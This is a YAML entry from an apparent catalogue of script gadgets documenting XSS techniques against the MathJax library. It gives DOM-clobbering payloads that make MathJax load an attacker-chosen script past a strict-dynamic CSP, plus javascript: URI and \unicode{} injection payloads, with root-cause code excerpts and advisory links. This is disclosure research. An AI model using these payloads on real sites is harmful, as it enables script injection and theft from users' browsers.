---
description: MathJax is an open-source JavaScript display engine for LaTeX, MathML, and AsciiMath notation that works in all modern browsers.
github: mathjax/MathJax
gadgets:
  Latest (1):
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [MathJax](https://github.com/mathjax/MathJax) library uses the `document.currentScript` property or the `#MathJax-script` id as a node reference to load plugins.
        code: |
         <script nonce="secret" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
         $$\require{tex}$$

         <!-- user input -->
         <img name="currentScript" src="[current-location]/assets/xss/index.js">
    more-info: |
      **Root Cause**

      ```javascript
      t.getRoot = function() {
          var t = "//../../es5";
          if ("undefined" != typeof document) {
              var e = document.currentScript || document.getElementById("MathJax-script");
              e && (t = e.src.replace(/\/[^\/]*$/, ""))
          }
          return t
      }

      // [...]

      prefix: function(t) {
          for (var r; (r = t.name.match(/^\[([^\]]*)\]/)) && e.CONFIG.paths.hasOwnProperty(r[1]); )
              t.name = e.CONFIG.paths[r[1]] + t.name.substr(r[0].length);
          return !0
      }
      ```
    links:
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax3.md
  Latest (2):
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - before-lib-load
    pocs:
      - description: By default [MathJax](https://github.com/mathjax/MathJax) doesn't sanitize links allowing to use `javascript:` URI scheme.
        code: |
          <script async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>

          <!-- user input -->
          $$\href{javascript:alert(document.domain)}{CLICK}$$
    links:
      - https://docs.mathjax.org/en/latest/options/safe.html
      - https://huntr.com/bounties/125791b6-3a68-4235-8866-6bc3a52332ba
  ≤2.7.9:
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - a-tag
      - id-attr
      - name-attr
      - href-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [MathJax](https://github.com/mathjax/MathJax) library was using the `MathJax.root` property to load plugins. Since it was checking if the value exists before creating it, it was possible to clobber it.
        code: |
          <script nonce="secret" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS_CHTML"></script>

          <!-- user input -->
          <a id="MathJax"></a><a id="MathJax" name="root" href="[current-location]/assets/xss/index.js"></a>
    links:
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax2.md
    more-info: |
      **Root Cause**

      ```javascript
      if (document.getElementById && document.childNodes && document.createElement) {
          if (!(window.MathJax && MathJax.Hub)) {
              if (window.MathJax) {
                  window.MathJax = {
                      AuthorConfig: window.MathJax
                  }
              } else {
                  window.MathJax = {}
              }
      
      // [...]

      MathJax.Hub.Startup = {
          script: "",
          queue: MathJax.Callback.Queue(),
          signal: MathJax.Callback.Signal("Startup"),
          params: {},
          Config: function() {
              this.queue.Push(["Post", this.signal, "Begin Config"]);
              if (MathJax.AuthorConfig && MathJax.AuthorConfig.root) {
                  MathJax.Ajax.config.root = MathJax.AuthorConfig.root
              }
      
      // [...]

      fileURL: function(j) {
          var i;
          while ((i = j.match(/^\[([-._a-z0-9]+)\]/i)) && b.hasOwnProperty(i[1])) {
              j = (b[i[1]] || this.config.root) + j.substr(i[1].length + 2) // Loading MathJax.AuthorConfig.root and type coercice to String
          }
          return j
      }

      // [...]

      Load: function(k, m) {
          m = a.Callback(m);
          var l;
          if (k instanceof Object) {
              for (var j in k) {
                  if (k.hasOwnProperty(j)) {
                      l = j.toUpperCase();
                      k = k[j]
                  }
              }
          } else {
              l = k.split(/\./).pop().toUpperCase()
          }
          k = this.fileURL(k);
          if (this.loading[k]) {
              this.addHook(k, m)
          } else {
              this.head = h(this.head);
              if (this.loader[l]) {
                  this.loader[l].call(this, k, m) // Calls loader['JS'] below

      // [...]

      loader: {
          JS: function(k, m) {
              var j = this.fileName(k);
              var i = document.createElement("script");
              var l = a.Callback(["loadTimeout", this, k]);
              this.loading[k] = {
                  callback: m,
                  timeout: setTimeout(l, this.timeout),
                  status: this.STATUS.OK,
                  script: i
              };
              this.loading[k].message = a.Message.File(j);
              i.onerror = l;
              i.type = "text/javascript";
              i.src = k + this.fileRev(j);
              this.head.appendChild(i)
          }
      ```
  ≤2.7.3:
    authors:
      - twitter:securitymb
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - any-attr
      - before-lib-load
    pocs:
      - description: The [MathJax](https://github.com/mathjax/MathJax) library was retuning the content of `\unicode{}` as raw.
        code: \unicode{<img src=x onerror=alert(document.domain)>}
        preview: false
    links:
      - https://github.com/mathjax/MathJax/commit/a55da396c18cafb767a26aa9ad96f6f4199852f1
      - https://blog.bentkowski.info/2018/06/xss-in-google-colaboratory-csp-bypass.html
---
